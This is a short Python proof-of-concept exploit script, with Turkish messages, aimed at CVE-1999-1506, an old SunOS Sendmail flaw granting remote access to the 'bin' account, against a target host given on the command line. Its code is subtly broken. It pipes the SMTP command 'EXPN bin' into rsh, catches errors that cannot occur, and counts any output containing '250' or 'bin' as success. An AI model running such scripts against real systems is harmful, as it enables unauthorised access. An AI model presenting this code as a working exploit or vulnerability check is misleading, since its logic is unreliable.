import socket
import argparse
import subprocess
import re
import time

# CVE-1999-1506: Vulnerability in SMI Sendmail 4.0 and earlier, on SunOS up to 4.0.3
# This vulnerability allows remote attackers to access the user 'bin'.
# The exploit targets the SMI Sendmail utility, allowing unauthorized remote access to the bin user account.

def test_sendmail_bin_access_vuln(target_host, retries=3):
    # Example payload to exploit SMI Sendmail vulnerability
    sendmail_payload = "EXPN bin\n"  # Sendmail command to attempt accessing user 'bin'
    
    for attempt in range(retries):
        try:
            # Attempting to exploit Sendmail vulnerability
            proc = subprocess.Popen(['rsh', target_host], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = proc.communicate(input=sendmail_payload.encode())
            
            # Check if the command was executed successfully or if information was leaked
            if re.search(r"250|bin|user found", output.decode(errors='replace'), re.IGNORECASE):
                print(f"[+] ({attempt + 1}/{retries}) Hedef sistem potansiyel olarak CVE-1999-1506 zafiyetine sahip olabilir! Kullanıcı 'bin' erişimi sağlandı.")
            else:
                print(f"[-] ({attempt + 1}/{retries}) Hedef sistemde zafiyet tespit edilemedi.")
            
            break
        except socket.error as e:
            print(f"[-] ({attempt + 1}/{retries}) Hedefe bağlanırken bir hata oluştu: {e}")
        except Exception as e:
            print(f"[!] Exploit sırasında bir hata oluştu: {e}")
        
        # Eğer bağlantı başarısız olursa, biraz bekleyip tekrar deneyelim.
        if attempt < retries - 1:
            time.sleep(3)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PoC script for Sendmail Bin User Access CVE-1999-1506")
    parser.add_argument("-t", "--target", required=True, help="Hedef sunucu IP adresi veya hostname")
    parser.add_argument("-v", "--verbose", action="store_true", help="Detaylı çıktı")
    parser.add_argument("--retries", type=int, default=3, help="Başarısız bağlantılar için tekrar deneme sayısı (varsayılan: 3)")
    
    args = parser.parse_args()
    
    if args.verbose:
        print(f"[i] Hedef: {args.target}, Retries: {args.retries}")
    
    test_sendmail_bin_access_vuln(args.target, retries=args.retries)